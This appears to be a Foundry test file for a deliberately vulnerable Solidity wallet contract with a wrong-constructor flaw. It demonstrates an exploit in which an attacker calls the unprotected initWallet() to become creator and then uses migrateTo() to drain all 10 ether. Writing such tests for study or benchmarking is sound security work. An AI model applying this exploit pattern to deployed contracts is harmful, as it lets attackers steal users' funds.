pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/wallet_03_wrong_constructor.sol";

contract WalletTest is Test {
    Wallet public wallet;
    address owner = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        // Deploy the Wallet contract
        wallet = new Wallet();
        // Fund the contract with 10 ether
        vm.deal(address(wallet), 10 ether);
        // Attacker starts with 0 ether
        vm.deal(attacker, 0);
    }

    function testNonCreatorCanMigrateFunds() public {
        // Record initial balances
        uint256 contractBalanceBefore = address(wallet).balance;
        assertEq(contractBalanceBefore, 10 ether, "Contract should have 10 ether initially");
        assertEq(attacker.balance, 0, "Attacker should have 0 ether initially");

        // Attacker initializes wallet to set themselves as creator
        vm.prank(attacker);
        wallet.initWallet();

        // Attacker migrates all funds to themselves
        vm.prank(attacker);
        wallet.migrateTo(attacker);

        // Check fund transfer succeeded
        assertEq(address(wallet).balance, 0, "Contract balance should be drained");
        assertEq(attacker.balance, 10 ether, "Attacker should receive 10 ether");
    }
}
